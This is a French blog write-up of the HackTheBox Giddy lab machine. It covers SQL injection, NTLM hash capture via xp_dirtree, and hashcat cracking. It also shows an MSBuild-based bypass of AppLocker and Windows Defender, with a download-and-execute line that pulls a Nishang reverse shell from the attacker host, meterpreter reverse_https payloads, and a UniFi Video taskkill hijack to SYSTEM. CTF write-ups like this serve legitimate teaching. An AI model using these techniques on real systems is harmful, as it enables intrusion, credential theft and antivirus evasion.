# Solution du CTF Giddy de HackTheBox

Giddy j'y reste
---------------

C'est le retour d'une machine Windows sur HackTheBox et l'occasion une nouvelle fois de taquiner un *Windows Defender* toujours plus à l’affût des scripts PowerShell.  

Que du bon en perspective :)  

Can I has hash please ?
-----------------------

Notre cible dispose de deux ports avec une bannière *IIS httpd 10.0* : les classiques ports 80 et 443.  

Le certificat SSL laisse voir un CN avec la valeur énigmatique *PowerShellWebAccessTestWebSite*.  

Les autres ports ouverts sont un RDP (*3389 : ms-wbt-server Microsoft Terminal Services*) ainsi qu'un *WinRM* (*Windows Remote Management*, port 5985 avec la bannière *Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)*).  

Les pages d'index des IIS ne nous offrent rien de plus que la tête d'un chien à la fenêtre d'une voiture, on s'empresse d'utiliser un dirbuster (on utilisera un dictionnaire lowercase pour gagner du temps, les systèmes de fichiers de ce système étant insensibles à la casse) qui nous trouve deux dossiers : */remote* et */mvc*.

Sur */remote* on trouve un *Powershell Web Access*. Sans trop savoir de quoi il s'agit on devine ce qu'il peut y avoir derrière.  

![HackTheBox Giddy PowerShell Web Access login page](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/giddy_pwa.png)

Quelques essais de logins n'ont amenés nul part. A noter la présence de différents champs cachés de formulaire (dans le style *\_\_VIEWSTATE*) qui compliquent bien les attaques brute-force.  

Sur */mvc* on trouve une appli web marchande non identifiée mais très classique (login, création de compte, liste de produits, formulaire de recherche).  

Le formulaire de recherche est vulnérable à une injection SQL bien verbeuse :  

```plain
Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
Incorrect syntax near ''.
   _1_Injection.Search.Button1_Click(Object sender, EventArgs e) in C:\Users\jnogueira\Downloads\owasp10\1-owasp-top10-m1-injection-exercise-files\before\1-Injection\Search.aspx.cs:30
```

Ça laisse supposer qu'on est en face d'une appli destinée à s’entraîner à l'exploitation de failles SQL :)  

Je lance [Wapiti](http://wapiti.sourceforge.net/) sur le site qui trouve différents points d'attaque pour l'injection SQL dont celle-ci en GET :  

![HackTheBox Giddy Wapiti SQL injection report](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/giddy_wapiti.png)

J'ai lancé SQLmap sur cette URL qui p'a permis d'obtenir la liste des utilisateurs suivants du système ainsi que différentes infos :  

```plain
[*] BUILTIN\\Users
[*] giddy\\stacy
[*] sa (administrator)

current database:    'Injection'
current user:    'giddy\\stacy'
hostname:    'GIDDY\SQLEXPRESS'
```

Pour le reste aucune information sensible ne semble présente dans les bases de données... C'est bien la peine.  

Alors je me suis dit, c'est dommage qu'on ne puisse pas provoquer une connexion SMB sortante afin de récupérer le hash NTLM de l'utilisateur faisant tourner le serveur SQL.  

Et bien si on peut grace au module [mssql\_ntlm\_stealer\_sqli](https://github.com/rapid7/metasploit-framework/pull/920) de Metasploit.  

Ce module utilise en fait la procédure *xp\_dirtree* de MSSQL. J'avais quand même un doute quand au succès de cette technique vu que notre utilisateur courant n'est pas administrateur de la base de données.  

On va pour cela mettre d'abord en écoute (et en background) notre port 445 via le module *capture/smb* puis ensuite exécuter le module *stealer* pour provoquer l'utilisation de *xp\_dirtree* sur notre faux partage SMB :  

```plain
msf auxiliary(server/capture/smb) > show options

Module options (auxiliary/server/capture/smb):

   Name        Current Setting   Required  Description
   ----        ---------------   --------  -----------
   CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
   CHALLENGE   1122334455667788  yes       The 8 byte server challenge
   JOHNPWFILE  /tmp/yolo         no        The prefix to the local filename to store the hashes in John format
   SRVHOST     10.10.12.177      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     445               yes       The local port to listen on.

Auxiliary action:

   Name     Description
   ----     -----------
   Sniffer

msf auxiliary(server/capture/smb) > exploit -j
[*] Auxiliary module running as background job 0.

[*] Server started.
msf auxiliary(server/capture/smb) > use auxiliary/admin/mssql/mssql_ntlm_stealer_sqli
msf auxiliary(admin/mssql/mssql_ntlm_stealer_sqli) > show options

Module options (auxiliary/admin/mssql/mssql_ntlm_stealer_sqli):

   Name      Current Setting                                     Required  Description
   ----      ---------------                                     --------  -----------
   COOKIE                                                        no        Cookie value
   DATA                                                          no        POST data, if necessary, with [SQLi] indicating the injection
   GET_PATH  /mvc/Product.aspx?ProductSubCategoryId=2;[SQLi];--  yes       The complete path with [SQLi] indicating the injection
   METHOD    GET                                                 yes       GET or POST
   Proxies                                                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST     10.10.10.104                                        yes       The target address
   RPORT     80                                                  yes       The target port (TCP)
   SMBPROXY  10.10.12.177                                        yes       IP of SMB proxy or sniffer.
   SSL       false                                               no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                         no        HTTP server virtual host

msf auxiliary(admin/mssql/mssql_ntlm_stealer_sqli) > exploit -j
[*] Auxiliary module running as background job 1.

[*] DONT FORGET to run a SMB capture or relay module!
[*] Attempting to force backend DB to authenticate to the 10.10.12.177
```

Il se passe pas loin d'une minute avant que le hash nous parvienne (le suspense était à son comble :D )  

```plain
msf auxiliary(admin/mssql/mssql_ntlm_stealer_sqli) > [*] SMB Captured - 2018-09-09 16:05:03 +0200
NTLMv2 Response Captured from 10.10.10.104:50510 - 10.10.10.104
USER:Stacy DOMAIN:GIDDY OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:3dd421f5a649e9d8791e12079d40deba
NT_CLIENT_CHALLENGE:0101000000000000955d6e450f49d4014a45499f2100a5a400000000020000000000000000000000
```

[Et on ne regrette pas sa soirée !](https://www.youtube.com/watch?v=XqhOTzgqHug)  

Un petit coup de *hashcat* plus tard et on a le password en clair :  

```plain
$ hashcat-cli64.bin -a 0 -m 5600 yolo_netntlmv2 /opt/wordlists/rockyou.txt
Initializing hashcat v2.00 with 4 threads and 32mb segment-size...

Added hashes from file yolo_netntlmv2: 1 (1 salts)
Activating quick-digest mode for single-hash with salt

STACY::GIDDY:1122334455667788:3dd421f5a649e9d8791e12079d40deba:0101000000000000955d6e450f49d4014a45499f2100a5a400000000020000000000000000000000:xNnWo6272k7x

All hashes have been recovered
```

Oh Oh voilà Stacy
-----------------

[On aurait pu penser que ce serait un beau cadeau](https://www.youtube.com/watch?v=BQVBjHLXHbo) mais si on tente d'utiliser les identifiants pour RDP ou WinRM... c'est l'échec total :(   

Heureusement les identifiants fonctionnent sur *Powershell Web Access*. La mire de login est toutefois assez pointilleuse puisque le nom d'utilisateur doit être *GIDDY\stacy* et non *stacy* tout court :(   

On obtient alors une session Powershell mais la joie est de courte durée puisque l'on est dans un mode de langage restreint (à différencier [des modes d'exécution](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6), ici la valeur par défaut est en place). Le plus gênant est que l'on ne peut pas créer de nouvel objet donc pas de *WebClient* pour télécharger d'autre code Powershell ou passer un meterpreter via *web\_delivery*.  

![HackTheBox Giddy PowerShell Web Access session in constrained language](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/giddy_pwa_session.png)

On serait tenté d'utiliser les commandes DOS pour copier un exécutable (ou même l'appeler directement depuis un partage SMB) mais c'est sans compter sur les GPOs :  

```plain
Program 'nc64.exe' failed to run: This program is blocked by group policy. For more information, contact your system administrator.
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Pour résumer on ne peut rien faire d'avancé en Powershell dans cet interpréteur et on ne peut qu'utiliser les exécutables Windows déjà présents sur le système...  

On est dans la même situation que si on voulait passer un [AppLocker](https://en.wikipedia.org/wiki/AppLocker) donc autant utiliser les même astuces.  

On peut suivre [l'un des exemples de pentestlab](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/), récupérer [ce template XML pour MSBuild](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml) et éditer le shellcode pour y placer (par exemple) un reverse Meterpreter winhttps qu'on aura généré avec *msfvenom*.  

Sauf qu'au moment de l'exécution :  

```plain
c:/windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe yolo.csproj
Microsoft (R) Build Engine version 4.6.1586.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 9/11/2018 4:43:56 AM.
Project "C:\users\stacy\downloads\yolo.csproj" on node 1 (default targets).
C:\users\stacy\downloads\yolo.csproj(8,5): error MSB4175: The task factory "CodeTaskFactory" could not be loaded from the assembly "C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll".
Operation did not complete successfully because the file contains a virus or potentially unwanted software.

C:\users\stacy\downloads\yolo.csproj(8,5): error MSB4175:

Done Building Project "C:\users\stacy\downloads\yolo.csproj" (default targets) -- FAILED.

Build FAILED.

"C:\users\stacy\downloads\yolo.csproj" (default target) (1) ->
(Hello target) ->
  C:\users\stacy\downloads\yolo.csproj(8,5): error MSB4175: The task factory "CodeTaskFactory" could not be loaded from
 the assembly "C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll". Operation did not complet
e successfully because the file contains a virus or potentially unwanted software.
C:\users\stacy\downloads\yolo.csproj(8,5): error MSB4175:

    0 Warning(s)
    1 Error(s)

Time Elapsed 00:00:02.90
```

Cette fois c'est *Windows Defender* qui fait des siennes...  

Une solution est de prendre un template XML qui ne contient pas de shellcodes mais va simplement exécuter du code Powerwhell. On peut se baser [sur celui-ci](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml) qui ne fonctionnera pas tel quel dans notre interface web (car elle ne retransférera pas les commandes saisies vers le process) mais on peut l'éditer simplement pour retirer la boucle dans *Execute()* et mettre à la ligne suivante pour obtenir [notre reverse shell Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) :  

```plain
RunPSCommand("IEX (New-Object System.Net.WebClient).downloadString('http://10.10.13.82/Invoke-PowerShellTcp.ps1')");
```

Avec le shell ainsi obtenu on peut charger d'autres scripts PowerShell bien connus (*Sherlock*, *PowerUp*...)  

Durant l'exploration du système j'ai croisé un bon gros troll des familles placé par le créateur de la machine :  

```plain
PS C:\> Get-UnattendedInstallFile

UnattendPath
------------
C:\Windows\Panther\Unattend.xml

PS C:\> type C:\Windows\Panther\Unattend.xml
Try Harder! ( =
```

Hack The Planet
---------------

Ok c'est bien mais profiter de tous les modules de *Metasploit* c'est mieux. Je me suis penché sur d'autres solutions pour bypasser *Defender* et je suis tombé sur [un très bon article de n00py](https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/), en particulier la partie faisant référence au fork de *nps\_payload* par *Franci Šacer*.  

L'avantage de ce fork c'est l'option 2 qui prend le code C# généré par *msfvenom* pour l'encoder en base64 et le placer dans le fichier XML.  

Lors de l'appel par MSBuild la chaine base64 est décodée, le code C# compilé puis exécuté à la volée. C'est beau !  

```plain
$ python nps_payload.py

                                     (            (
                              ) (    )\        )  )\ )
  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)
 _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |
| ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |
|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
      |_|     |_____|_|         |__/

                       v1.04

    (1) Generate msbuild/nps/msf payload
    (2) Generate msbuild/nps/msf CSharp payload
    (3) Generate msbuild/nps/msf HTA payload
    (99)    Quit

Select a task: 2

Payload Selection:

    (1) windows/meterpreter/reverse_tcp
    (2) windows/meterpreter/reverse_http
    (3) windows/meterpreter/reverse_https

Select payload: 3
Enter Your Local IP Address (10.0.2.15): 10.10.13.82
Enter the listener port (443): 443
[*] Generating RAW shellcode Payload...
[*] Generating MSF Resource Script...
[+] Metasploit resource script written to msbuild_nps.rc
[+] Payload written to msbuild_nps.xml

1. Run "msfconsole -r msbuild_nps.rc" to start listener.
2. Choose a Deployment Option (a or b): - See README.md for more information.
  a. Local File Deployment:
    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
  b. Remote File Deployment:
    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
3. Hack the Planet!!
```

Il ne reste plus qu'à mettre un multi/handler en écoute et passer le csproj généré à MSBuild :  

```plain
c:/windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe  \\10.10.13.82\public\msbuild_nps.xml
```

```plain
msf exploit(multi/handler) > use multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(multi/handler) > set LHOST 10.10.13.82
LHOST => 10.10.13.82
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 12.
msf exploit(multi/handler) >
[*] Started HTTPS reverse handler on https://10.10.13.82:443
[*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: mhbtagrf) Encoded stage with x86/shikata_ga_nai
[*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: mhbtagrf) Staging x86 payload (180854 bytes) ...
[*] Meterpreter session 1 opened (10.10.13.82:443 -> 10.10.10.104:50308) at 2018-09-11 21:23:12 +0200

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: GIDDY\Stacy
```

On obtient une session Meterpreter en x86 mais whatever puisque pour une fois *migrate* fonctionne et on peut passer sur un process x64 :)   

Got root(.txt)
--------------

Malheureusement on ne trouve pas grand chose à se mettre sous la dent en terme d'escalade de privilèges.  

Il y a tout de même un mystérieux fichier *unifivideo* présent dans le dossier *Documents* de l'utilisateur qui est probablement un indice pour nous mener à [cette vulnérabilité](https://seclists.org/fulldisclosure/2017/Dec/83) affectant le service *Ubiquiti UniFi Video*.  

Les conditions semblent être bonnes avec le dossier écrivable dans *ProgramData* :  

```plain
c:\programdata>icacls unifi-video
icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

Et la présence du fameux service :  

```plain
PS C:\ProgramData\unifi-video>
Get-Service -Name "Ubiquiti UniFi Video"

Status   Name               DisplayName
------   ----               -----------
Stopped  UniFiVideoService  Ubiquiti UniFi Video
```

Le principe de la vulnérabilité est le suivant : au lancement ou à l'arrêt du service l'exécutable *taskkill* est exécuté (certainement pour tuer les instances existantes du service) sauf qu'il est cherché dans le dossier *unifi-video* au lieu d'aller directement le prendre là où il est (*system32* je suppose).  

Du coup il suffit d'y placer un exécutable à nous et stopper / lancer le service. Pas de prise de tête avec l'antivirus j'ai fait un simple programme (cross-compilé depuis Kali) qui réutilise MSBuild et notre fichier csproj précédent :  

```c
$ cat test.c
#include <unistd.h>

int main(void) {
    system("c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe  \\\\10.10.13.82\\public\\msbuild_nps.xml");
    return 0;
}
$ i686-w64-mingw32-gcc -o taskkill.exe test.c
```

```plain
Start-Service -Name "Ubiquiti UniFi Video"
Stop-Service -Name "Ubiquiti UniFi Video"
```

Ainsi on obtient notre meterpreter depuis lequel on télécharge le flag (CF559C6C121F683BF3E56891E80641B1) et on peut si on le souhaite avoir une invite de commande sans être détecté :)   

```plain
msf exploit(multi/handler) > [*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: dltetexe) Encoded stage with x86/shikata_ga_nai
[*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: dltetexe) Staging x86 payload (180854 bytes) ...
[*] Meterpreter session 2 opened (10.10.13.82:443 -> 10.10.10.104:50086) at 2018-09-11 21:45:27 +0200

msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer        : GIDDY
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cd c:/users/administrator/desktop
meterpreter > download root.txt
[*] Downloading: root.txt -> root.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): root.txt -> root.txt
[*] download   : root.txt -> root.txt
meterpreter > shell
Process 4972 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\users\administrator\desktop>whoami
whoami
nt authority\system
```

Victory
-------

Encore une fois un challenge très intéressant qui a permis d'utiliser différentes techniques de contournement de la sécurité sous Windows.

*Published February 16 2019 at 16:21*